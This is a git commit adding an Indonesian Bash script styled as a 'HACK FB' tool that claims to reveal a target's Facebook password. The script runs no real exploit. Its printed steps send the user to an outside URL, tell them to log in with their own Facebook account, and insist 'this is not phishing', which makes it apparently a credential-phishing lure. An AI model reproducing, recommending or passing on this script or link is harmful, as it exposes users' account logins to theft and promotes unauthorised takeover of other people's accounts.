b2a5476559a6c81ce9bb5a10a5a9699dab305ebf
Cokkar <50707655+Cokkar@users.noreply.github.com>
2019-05-20 18:48:06 +0700

    Add files via upload

---
+++ hacktarget.sh
@@ -0,0 +1,67 @@
+#!/system/xbin/bash
+echo
+hitam='\033[0;30m'
+darkdray='\033[1;30m'
+merah='\033[0;31m'
+Lmerah='\033[1;31m'
+hijau='\033[0;32m'
+Lhijau='\033[1;32m'
+brown='\033[0;33m'
+kuning='\033[1;33m'
+biru='\033[0;34m'
+Lbiru='\033[1;34m'
+ungu='\033[0;35m'
+Lungu='\033[1;35m'
+cyan='\033[0;36m'
+Lcyan='\033[1;36m'
+Lgray='\033[0;37m'
+clear
+echo $Lcyan"."
+figlet "HACK FB>>"
+sleep 00.3
+clear
+echo $Lcyan"SLAMAT DATANG DITOOLS HACK FB"
+echo $Lcyan"JIKA PERTEMANAN MELEBIHI 1000 PASTI WORK"
+sleep 3
+clear
+echo $Lbiru"Jika Belom Tau Caranya Silahkan Ketik Y"
+echo $Lbiru"Jika Sudah Tau Caranya Ketik N"
+echo $Lbiru"Pilih Y/N="
+read -p "PILIH Y/N : " cokk
+if [ $cokk = y ] || [ $cokk = Y ]
+then
+clear
+echo "1.Cara Hack Fb Dengan Browser"
+echo
+echo "2.Pertama Masukan Link Ini Di Browser kesayanganmu"
+echo
+echo "http://ekoversitetet.se/94508//z3MBx/?sc=1&sc=1&l=1&ppy=4913361&i=4913361"
+echo
+echo "3.Setelah itu Login Dulu pake akun facebook kalian"
+echo "INI BUKAN PHISING COKK!!!!"
+echo
+echo "4.Jika Sudah Login Nanti Di Minta Id Target"
+echo
+echo "5.Cari Id Target Kalau Belom Tau Cara Cari Id Target"
+echo "Lihat Digoogle Yah"
+echo
+echo "6.Lalu Klik Hackfbhack warna hijau"
+echo
+echo "7.Tunggu Proses Hack Dimulai Yahh.."
+echo
+echo "8.Jika Sudah Nanti Akan Keluar Kata Sandinya"
+echo
+echo "9.Sekian Dari Saya Yahh....Itu Browser Saya Sendiri"
+echo
+echo $Lmerah"Maaf Sebelumnya Yah Belom Suport Bahasa"
+echo "Indonesia MAAF :*"
+echo
+echo $Lhijau"."
+figlet HACKFB
+fi
+
+if [ $cokk = n ] || [ $cokk = N ]
+then
+clear
+exit
+fi
